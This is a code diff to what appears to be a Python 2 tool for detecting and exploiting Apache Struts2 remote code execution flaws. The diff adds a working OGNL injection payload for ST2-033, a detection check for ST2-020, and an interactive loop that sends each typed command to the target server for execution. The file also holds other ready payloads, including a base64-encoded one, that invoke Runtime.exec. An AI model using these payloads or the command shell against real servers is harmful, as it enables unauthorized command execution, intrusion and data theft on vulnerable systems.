@@ -40,6 +40,7 @@ class struts_baseverify:
                 "ST2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ=="),
                 "ST2-devmode":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an''',
                 "ST2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8''', 
+                "ST2-033":'''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=netstat -an''',
                 "ST2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an''',
                 "ST2-045":"",
                 }
@@ -51,6 +52,7 @@ class struts_baseverify:
                 "struts2-019":base64.b64decode("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeydGVVpaSU5HQ09NTUFORCd9KSkuc3RhcnQoKSwjYj0jYS5nZXRJbnB1dFN0cmVhbSgpLCNjPW5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKCNiKSwjZD1uZXcgamF2YS5pby5CdWZmZXJlZFJlYWRlcigjYyksI2U9bmV3IGNoYXJbMTAwMDBdLCNkLnJlYWQoI2UpLCNyZXNwLnByaW50bG4oI2UpLCNyZXNwLmNsb3NlKCk="),
                 "struts2-devmode":'''?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=FUZZINGCOMMAND''',
                 "struts2-032":'''?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=FUZZINGCOMMAND&pp=____A&ppp=%20&encoding=UTF-8''',
+                "struts2-033":'''/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=FUZZINGCOMMAND''',
                 "struts2-037":'''/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=FUZZINGCOMMAND''',
                 "struts2-045":"",
                 }
@@ -81,36 +83,49 @@ class struts_baseverify:
             self.check("struts2-005", req.text)
         except:
             cprint("检测struts2-005超时..", "cyan")
+
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-009'], timeout=6, verify=False)
             self.check("struts2-009", req.text)
         except:
             cprint("检测struts2-009超时..", "cyan")
+
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-013'], timeout=6, verify=False)
             self.check("struts2-013", req.text)
         except:
             cprint("检测struts2-013超时..", "cyan")
+
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-016'], timeout=6, verify=False)
             self.check("struts2-016", req.text)
         except:
             cprint("检测struts2-016超时..", "cyan")
+
         try:
             req = requests.post(self.url, headers=headers, data=self.poc['ST2-019'], timeout=6, verify=False)
             self.check("struts2-019", req.text)
         except:
             cprint("检测struts2-019超时..", "cyan")
+
         try:
             req = requests.get(self.url+self.poc['ST2-devmode'], headers=headers, timeout=6, verify=False)
             self.check("struts2-devmode", req.text)
         except:
             cprint("检测struts2-devmode超时..", "cyan")
+
         try:
             req = requests.get(self.url+self.poc['ST2-032'], headers=headers, timeout=6, verify=False)
             self.check("struts2-032", req.text)
         except:
             cprint("检测struts2-032超时..", "cyan")
+
+        try:
+            req = requests.get(self.url+self.poc['ST2-033'], headers=headers, timeout=6, verify=False)
+            self.check("struts2-033", req.text)
+        except:
+            cprint("检测struts2-033超时..", "cyan")
+
         try:
             req = requests.get(self.url+self.poc['ST2-037'], headers=headers, timeout=6, verify=False)
             self.check("struts2-037", req.text)
@@ -128,6 +143,17 @@ class struts_baseverify:
             self.check("struts2-048", req.text)
         except:
             cprint("检测struts2-048超时..", "cyan")
+
+        try:
+            req1 = requests.get(self.url+"?class[%27classLoader%27][%27jarPath%27]=1", headers=headers, timeout=6, verify=False)
+            req2 = requests.get(self.url+"?class[%27classLoader%27][%27resources%27]=1", headers=headers, timeout=6, verify=False)
+            if req1.status_code == 200 and req2.status_code == 404:
+                cprint("目标存在struts2-020漏洞..(只提供检测)", "red")
+            else:
+                cprint("目标不存在struts2-020漏洞..", "green")
+        except:
+            cprint("检测struts2-020超时..", "cyan")
+
 
     def inShell(self, pocname):
         cprint('''
@@ -239,6 +265,21 @@ class struts_baseverify:
                 if command != "exit":
                     try:
                         commurl = self.url+self.shell['struts2-032'].replace("FUZZINGCOMMAND", command)
+                        req = requests.get(commurl, headers=headers, timeout=6, verify=False)
+                        print req.text
+                    except:
+                        cprint("命令执行失败!!!", "red")
+                else:
+                    sys.exit(1)
+
+        if pocname == "struts2-033":
+            while True:
+                print prompt,
+                command = raw_input()
+                command = command.strip()
+                if command != "exit":
+                    try:
+                        commurl = self.url+self.shell['struts2-033'].replace("FUZZINGCOMMAND", command)
                         req = requests.get(commurl, headers=headers, timeout=6, verify=False)
                         print req.text
                     except:
